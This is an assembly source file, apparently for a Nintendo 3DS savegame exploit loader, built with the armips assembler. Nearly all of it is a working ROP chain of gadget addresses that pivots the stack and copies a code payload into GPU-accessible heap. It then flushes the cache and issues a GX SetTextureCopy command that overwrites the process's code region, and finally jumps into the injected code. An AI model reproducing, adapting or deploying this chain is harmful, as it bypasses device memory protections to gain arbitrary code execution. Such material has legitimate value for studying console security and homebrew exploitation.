.nds

.open "sploit_proto.bin","cn_save_initial_loader.bin",0x0

GSPHEAP equ 0x14000000
PATCHLOCATION equ GSPHEAP
TEXTPAOFFSET equ 0x03E00000
STACKPAYLOADADR equ 0x0FFFFC5C
PAYLOADADR equ 0x08F1D9C8
CODELOCATIONVA equ (PAYLOADADR+codePatch-ROP)
CODELOCATIONPAOFF equ (0x100000)
CODELOCATIONGSP equ (GSPHEAP+CODELOCATIONPAOFF)

.arm

;length
.orga 0x60
	.word endROP-ROP+0xA8-0x64
	; .word secondaryROP-ROP+0xA8-0x64

;ROP
.orga 0xA8
ROP:
	;jump to safer place
		.word 0x001001c8 ; pop {r3} | add sp, sp, r3 | pop {pc}
			.word PAYLOADADR-STACKPAYLOADADR ; r3

secondaryROP:
	;copy code to GSP heap
		.word 0x001bbeb8 ; pop {r3, pc}
			.word 0x002c9628 ; r3 (pop {r0, pc})
		.word 0x00106eb8 ; pop {r4, lr} | bx r3
			.word 0xDEADBABE ; r4 (garbage)
			.word 0x002c9628 ; lr (pop	{r0, pc})
		;equivalent to .word 0x002c9628 ; pop {r0, pc}
			.word CODELOCATIONGSP    ; r0 (dst)
		.word 0x00226734 ; pop	{r1, pc}
			.word CODELOCATIONVA ; r1 (src)
		.word 0x0020b8e8 ; pop	{r2, r3, r4, pc}
			.word codePatchEnd-codePatch ; r2 (size)
			.word 0xDEADBABE ; r3 (garbage)
			.word 0xDEADBABE ; r4 (garbage)
		.word 0x00224FB0 ; memcpy (ends in BX	LR)

	;flush data cache
		;equivalent to .word 0x002c9628 ; pop {r0, pc}
			.word 0x00334F28 ; r0 (handle ptr)
		.word 0x00226734 ; pop	{r1, pc}
			.word 0xFFFF8001 ; r1 (kprocess handle)
		.word 0x0020b8e8 ; pop	{r2, r3, r4, pc}
			.word CODELOCATIONGSP  ; r2 (address)
			.word codePatchEnd-codePatch ; r3 (size)
			.word 0xDEADBABE ; r4 (garbage)
		.word 0x002D15D8 ; GSPGPU_FlushDataCache (ends in LDMFD   SP!, {R4-R6,PC})
			.word 0xDEADBABE ; r4 (garbage)
			.word 0xDEADBABE ; r5 (garbage)
			.word 0xDEADBABE ; r6 (garbage)

	;send GX command
		.word 0x002c9628 ; pop	{r0, pc}
			.word 0x356208+0x58 ; r0
		.word 0x00226734 ; pop	{r1, pc}
			.word PAYLOADADR+gxCommand-ROP ; r1 (cmd addr)
		.word 0x001C2B58 ; nn__gxlow__CTR__CmdReqQueueTx__TryEnqueue (ends in LDMFD   SP!, {R4-R8,PC})
			.word 0xDEADBABE ; r4 (garbage)
			.word 0xDEADBABE ; r5 (garbage)
			.word 0xDEADBABE ; r6 (garbage)
			.word 0xDEADBABE ; r7 (garbage)
			.word 0xDEADBABE ; r8 (garbage)


	;sleep for a second and jump to code
		.word 0x00226734 ; pop {r3, pc}
			.word 0x002c9628 ; r1 (pop {r0, pc})
		.word 0x0012ec64 ; pop {r4, lr} | bx r1
			.word 0xDEADBABE ; r4 (garbage)
			; .word 0x00100000 ; lr (code addr)
			.word 0x002c9628 ; lr (pop {r0, pc})
		;equivalent to .word 0x002c9628 ; pop {r0, pc}
			.word 0x3B9ACA00 ; r0 = 1 second
		.word 0x00226734 ; pop	{r1, pc}
			.word 0x00000000 ; r1
		.word 0x00293D14 ; svcSleepThread (ends in BX	LR)
		;equivalent to .word 0x002c9628 ; pop {r0, pc}
			.word 0x00000000 ; r0 (time_low)
		.word 0x00226734 ; pop	{r1, pc}
			.word 0x00000000 ; r1 (time_high)
		; .word 0x00100000 ;jump to code
		.word 0x002D9700 ;jump to code

		.word 0xBEEF0000
endROP:

.align 4
gxCommand:
	.word 0x00000004 ;command header (SetTextureCopy)
	.word CODELOCATIONGSP ;source address
	; .word GSPHEAP+TEXTPAOFFSET ;destination address
	.word GSPHEAP+TEXTPAOFFSET+0x001D9700 ;destination address (put it at the end to avoid cache issues)
	.word 0x00010000 ;size
	.word 0xFFFFFFFF ; dim in
	.word 0xFFFFFFFF ; dim out
	.word 0x00000008 ; flags
	.word 0x00000000 ; unused

.align 4
codePatch:
	.incbin "cn_initial/cn_initial.bin"
	.word 0xDEADDEAD
	.word 0xDEADDEAD
	.word 0xDEADDEAD
	.word 0xDEADDEAD
codePatchEnd:

.Close
